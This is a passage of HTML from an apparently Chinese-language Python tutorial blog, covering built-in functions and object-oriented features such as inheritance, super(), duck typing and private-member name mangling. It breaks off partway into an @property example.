style="text-align:center"><code>divmod()</code></td><td style="text-align:center">除法，同时返回商和余数的元组</td></tr><tr><td style="text-align:center"><code>enumerate()</code></td><td style="text-align:center">枚举函数，在迭代对象的时候，额外提供一个序列号的输出</td></tr><tr><td style="text-align:center"><code>eval()</code></td><td style="text-align:center">将字符串直接解读并执行</td></tr><tr><td style="text-align:center"><code>gloabals()</code></td><td style="text-align:center">列出当前环境下所有的全局变量。注意要与global关键字区分</td></tr><tr><td style="text-align:center"><code>hash()</code></td><td style="text-align:center">为不可变对象，例如字符串生成哈希值的函数</td></tr><tr><td style="text-align:center"><code>help()</code></td><td style="text-align:center">返回对象的帮助文档</td></tr><tr><td style="text-align:center"><code>id()</code></td><td style="text-align:center">返回对象的内存地址,常用来查看变量引用的变化，对象是否相同等</td></tr><tr><td style="text-align:center"><code>isinstance()</code></td><td style="text-align:center">判断一个对象是否是某个类的实例</td></tr><tr><td style="text-align:center"><code>locals()</code></td><td style="text-align:center">返回当前可用的局部变量</td></tr><tr><td style="text-align:center"><code>max()/min()</code></td><td style="text-align:center">返回给定集合里的最大或者最小的元素。可以指定排序的方法</td></tr><tr><td style="text-align:center"><code>reversed()</code></td><td style="text-align:center">反转，逆序对象</td></tr><tr><td style="text-align:center"><code>round()</code></td><td style="text-align:center">四舍五入</td></tr><tr><td style="text-align:center"><code>sum()</code></td><td style="text-align:center">对可迭代的对象求和</td></tr><tr><td style="text-align:center"><code>sorted()</code></td><td style="text-align:center">排序方法。有key和reverse两个重要参数</td></tr></tbody></table><p>有个别遗漏可查看<a href="https://www.liujiangblog.com/course/python/40">python内置函数</a></p><h2 id="进阶知识">进阶知识</h2><h3 id="面向对象编程">面向对象编程</h3><p>面向对象的思想与其他编程语言相同，主要记录一下python独特的语法<br><strong>类和实例</strong><br>Python使用class关键字来定义类，其基本结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(<span class="title class_ inherited__">父类列表</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>类名通常采用驼峰式命名方式，尽量让字面意思体现出类的作用。Python采用多继承机制，一个类可以同时继承多个父类（也叫基类、超类），继承的基类有先后顺序，写在类名后的圆括号里。继承的父类列表可以为空，此时的圆括号可以省略。但在Python3中，即使你采用类似class Student:pass的方法没有显式继承任何父类的定义了一个类，它也默认继承object类。因为，object是Python3中所有类的基类。</p><p>下面是一个学生类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br></pre></td></tr></table></figure><p>可以通过调用类的实例化方法（有的语言中也叫初始化方法或构造函数）来创建一个类的实例。默认情况下，使用类似obj=Student()的方式就可以生成一个类的实例。但是，通常每个类的实例都会有自己的实例变量，例如这里的name和age，为了在实例化的时候体现实例的不同，Python提供了一个def <strong>init</strong>(self):的实例化机制。任何一个类中，名字为__init__的方法就是类的实例化方法，具有__init__方法的类在实例化的时候，会自动调用该方法，并传递对应的参数。比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">li = Student(<span class="string">&quot;李四&quot;</span>, <span class="number">24</span>)</span><br><span class="line">zhang = Student(<span class="string">&quot;张三&quot;</span>, <span class="number">23</span>)</span><br></pre></td></tr></table></figure><p><strong>实例变量和类变量</strong><br>实例变量和类变量<br><strong>实例变量</strong>：<br>实例变量指的是实例本身拥有的变量。每个实例的变量在内存中都不一样。Student类中__init__方法里的name和age就是两个实例变量。通过实例名加圆点的方式调用实例变量。</p><p>我们打印下面四个变量，可以看到每个实例的变量名虽然一样，但他们保存的值却是各自独立的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(li.name)</span><br><span class="line"><span class="built_in">print</span>(li.age)</span><br><span class="line"><span class="built_in">print</span>(zhang.name)</span><br><span class="line"><span class="built_in">print</span>(zhang.age)</span><br><span class="line">------------------------</span><br><span class="line">李四</span><br><span class="line"><span class="number">24</span></span><br><span class="line">张三</span><br><span class="line"><span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>类变量</strong>：<br>定义在类中，方法之外的变量，称作类变量。类变量是所有实例公有的变量，每一个实例都可以访问、修改类变量。在Student类中，classroom和address两个变量就是类变量。可以通过类名或者实例名加圆点的方式访问类变量，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Student.classroom</span><br><span class="line">Student.address</span><br><span class="line">li.classroom</span><br><span class="line">zhang.address</span><br></pre></td></tr></table></figure><p>在使用实例变量和类变量的时候一定要注意，使用类似zhang.name访问变量的时候，实例会先在自己的实例变量列表里查找是否有这个实例变量，如果没有，那么它就会去类变量列表里找，如果还没有，弹出异常。</p><p>Python动态语言的特点，让我们可以随时给实例添加新的实例变量，给类添加新的类变量和方法。因此，在使用li.classroom = '102’的时候，要么是给已有的实例变量classroom重新赋值，要么就是新建一个li专属的实例变量classroom并赋值为‘102’。看下面的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">Student</span>:              <span class="comment"># 类的定义体</span></span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span>           <span class="comment"># 类变量</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li = Student(<span class="string">&quot;李四&quot;</span>, <span class="number">24</span>)        <span class="comment"># 创建一个实例</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang = Student(<span class="string">&quot;张三&quot;</span>, <span class="number">23</span>)     <span class="comment"># 创建第二个实例</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom <span class="comment"># li本身没有classroom实例变量，所以去寻找类变量，它找到了！</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom <span class="comment"># 与li同理</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom   <span class="comment"># 通过类名访问类变量</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom = <span class="string">&#x27;102&#x27;</span>    <span class="comment"># 关键的一步！实际是为li创建了独有的实例变量，只不过名字和类变量一样，都叫做classroom。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom    <span class="comment"># 再次访问的时候，访问到的是li自己的实例变量classroom</span></span><br><span class="line"><span class="string">&#x27;102&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom <span class="comment"># zhang没有实例变量classroom，依然访问类变量classroom</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom   <span class="comment"># 保持不变</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> li.classroom    <span class="comment"># 删除了li的实例变量classroom</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>li.classroom        <span class="comment"># 一切恢复了原样</span></span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>zhang.classroom</span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.classroom</span><br><span class="line"><span class="string">&#x27;101&#x27;</span></span><br></pre></td></tr></table></figure><p>为了防止发生上面的混淆情况，对于类变量，请坚持使用类名.类变量的访问方式，不要用实例去访问类变量。</p><p><strong>封装、继承和多态</strong><br><strong>封装</strong><br>封装的思想不多赘述,只举具体实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    classroom = <span class="string">&#x27;101&#x27;</span></span><br><span class="line">    address = <span class="string">&#x27;beijing&#x27;</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line">bao = Student(<span class="string">&quot;Oracle&quot;</span>, <span class="number">18</span>)</span><br><span class="line">bao.print_age()</span><br><span class="line"><span class="comment"># 以下是错误的用法</span></span><br><span class="line"><span class="comment"># 类将它内部的变量和方法封装起来，阻止外部的直接访问</span></span><br><span class="line"><span class="built_in">print</span>(classroom)</span><br><span class="line"><span class="built_in">print</span>(adress)</span><br><span class="line">print_age()</span><br></pre></td></tr></table></figure><p><strong>继承</strong><br>继承最大的好处是子类获得了父类的全部变量和方法的同时，又可以根据需要进行修改、拓展。其语法结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>(superA, superB,superC....):</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>(modname.BaseClassName):  <span class="comment">## 当父类定义在另外的模块时</span></span><br></pre></td></tr></table></figure><p>Python支持多父类的继承机制，所以需要注意圆括号中基类的顺序，若是基类中有相同的方法名，并且在子类使用时未指定，Python会从左至右搜索基类中是否包含该方法。一旦查找到则直接调用，后面不再继续查找。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 父类定义</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">people</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, weight</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.__weight = weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁。&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单继承示例</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(<span class="title class_ inherited__">people</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age, weight, grade</span>):</span><br><span class="line">        <span class="comment"># 调用父类的实例化方法</span></span><br><span class="line">        people.__init__(self, name, age, weight)</span><br><span class="line">        self.grade = grade</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类的speak方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span> % (self.name, self.age, self.grade))</span><br><span class="line"></span><br><span class="line">s = student(<span class="string">&#x27;ken&#x27;</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">3</span>)</span><br><span class="line">s.speak()</span><br></pre></td></tr></table></figure><blockquote><p>Python3的继承机制不同于Python2。其核心原则是下面两条，请谨记！<br>子类在调用某个方法或变量的时候，首先在自己内部查找，如果没有找到，则开始根据继承机制在父类里查找。<br>根据父类定义中的顺序，以深度优先的方式逐一查找父类！</p></blockquote><p><strong>super()函数</strong><br>我们都知道，在子类中如果有与父类同名的成员，那就会覆盖掉父类里的成员。那如果你想强制调用父类的成员呢？使用super()函数！这是一个非常重要的函数，最常见的就是通过super调用父类的实例化方法<code>__init__</code>！</p><p>语法：<code>super(子类名, self).方法名()</code>，需要传入的是子类名和self，调用的是父类里的方法，按父类的方法需要传入参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类的__init__方法被执行了！&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;父类的show方法被执行了！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="built_in">super</span>(B, self).__init__(name=name)</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(B, self).show()</span><br><span class="line"></span><br><span class="line">obj = B(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.show()</span><br></pre></td></tr></table></figure><p><strong>多态</strong><br>先举个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am animal&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a dog&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a cat&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pig</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am a pig&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个函数接收一个animal参数，并调用它的kind方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_kind</span>(<span class="params">animal</span>):</span><br><span class="line">    animal.kind()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = Dog()</span><br><span class="line">c = Cat()</span><br><span class="line">p = Pig()</span><br><span class="line"></span><br><span class="line">show_kind(d)</span><br><span class="line">show_kind(c)</span><br><span class="line">show_kind(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------</span></span><br><span class="line"><span class="comment"># 打印结果：</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># i am a dog</span></span><br><span class="line"><span class="comment"># i am a cat</span></span><br><span class="line"><span class="comment"># i am a pig</span></span><br></pre></td></tr></table></figure><p>看上去与其他面向对象语言的多态没有区别，实际上，由于Python的动态语言特性，传递给函数show_kind()的参数animal可以是 任何的类型，只要它有一个kind()的方法即可。动态语言调用实例方法时不检查类型，只要方法存在，参数正确，就可以调用。这就是动态语言的“鸭子类型”，它并不要求严格的继承体系，一个对象只要“看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Job</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;i am not animal, i am a job&quot;</span>)</span><br><span class="line"></span><br><span class="line">j = Job()</span><br><span class="line">show_kind(j)</span><br></pre></td></tr></table></figure><p>可能有人会觉得，这些内容很自然啊，没什么不好理解，不觉得多态有什么特殊，Python就是这样啊！</p><p>如果你学过JAVA这一类强类型静态语言，就不会这么觉得了，对于JAVA，必须指定函数参数的数据类型，只能传递对应参数类型或其子类型的参数，不能传递其它类型的参数，show_kind()函数只能接收animal、dog、cat和pig类型，而不能接收job类型。就算接收dog、cat和pig类型，也是通过面向对象的多态机制实现的。</p><p><strong>成员保护和访问限制</strong><br>在类似JAVA的语言中，有private关键字，可以将某些变量和方法设为私有，阻止外部访问。但是，Python没有这个机制，Python利用变量和方法名字的变化，实现这一功能。<br>在Python中，如果要让内部成员不被外部访问，可以在成员的名字前<strong>加上两个下划线__，这个成员就变成了一个私有成员（private）。私有成员只能在类的内部访问，外部无法访问。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line">    title = <span class="string">&quot;人类&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.__name, self.__age))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">self, age</span>):</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.get_name()</span><br><span class="line">obj.set_name(<span class="string">&quot;tom&quot;</span>)</span><br></pre></td></tr></table></figure><p>python的有趣特性<br>以双下划线开头的数据成员是不是一定就无法从外部访问呢？其实也不是！本质上，从内部机制原理讲，外部不能直接访问<code>__age</code>是因为Python解释器对外把<code>__age</code>变量改成了<code>_People__age</code>，也就是<code>_类名__age</code>（类名前是一个下划线）。因此，投机取巧的话，你可以通过<code>_ People__age</code>在类的外部访问<code>__age</code>变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(obj._People__name)</span><br></pre></td></tr></table></figure><p>由于Python内部会对双下划线开头的私有成员进行名字变更，所以会出现下面的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line">    title = <span class="string">&quot;人类&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s: %s&#x27;</span> % (self.__name, self.__age))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = People(<span class="string">&quot;jack&quot;</span>, <span class="number">18</span>)</span><br><span class="line">obj.__name = <span class="string">&quot;tom&quot;</span>          <span class="comment"># 注意这一行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.__name:  &quot;</span>, obj.__name)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;obj.get_name():  &quot;</span>, obj.get_name())</span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------</span></span><br><span class="line"><span class="comment"># 打印结果：</span></span><br><span class="line"><span class="comment"># obj.__name:   tom</span></span><br><span class="line"><span class="comment"># obj.get_name():   jack</span></span><br></pre></td></tr></table></figure><p>此时的<code>obj.__name= 'tom'</code>，相当于给obj实例添加了一个新的实例变量<code>__name</code>,而不是对原有私有成员<code>__name</code>的重新赋值。</p><p>此外，有些时候，你会看到以一个下划线开头的成员名，比如<code>_name</code>，这样的数据成员在外部是可以访问的，但是，按照约定俗成的规定，当你看到这样的标识符时，意思就是，“虽然我可以被外部访问，但是，请把我视为私有成员，不要在外部访问我！”。</p><p>还有，在Python中，标识符类似<code>__xxx__</code>的，也就是以双下划线开头，并且以双下划线结尾的，是特殊成员，特殊成员不是私有成员，可以直接访问，要注意区别对待。同时请尽量不要给自定义的成员命名<code>__name__</code>或<code>__iter__</code>这样的标识，它们都是Python中具有特殊意义的魔法方法名。</p><p>类的成员与下划线总结：<br><code>_name、_name_、_name__</code>:建议性的私有成员，不要在外部访问。<br><code>__name、 __name_ </code>:强制的私有成员，但是你依然可以蛮横地在外部危险访问。<br><code>__name__</code>:特殊成员，与私有性质无关，例如<code>__doc__</code>。<br><code>name_、name__</code>:没有任何特殊性，普通的标识符，但最好不要这么起名。</p><p><strong>伪装类方法</strong></p><ol><li>@property装饰器——更多有关<a href="https://www.liujiangblog.com/course/python/39">装饰器</a>的知识</li></ol><p>Python内置的<code>@property</code>装饰器可以把类的方法伪装成属性调用的方式。也就是本来是<code>Foo.func()</code>的调用方法，变成<code>Foo.func</code>的方式。在很多场合下，这是一种非常有用的机制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__age = age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span 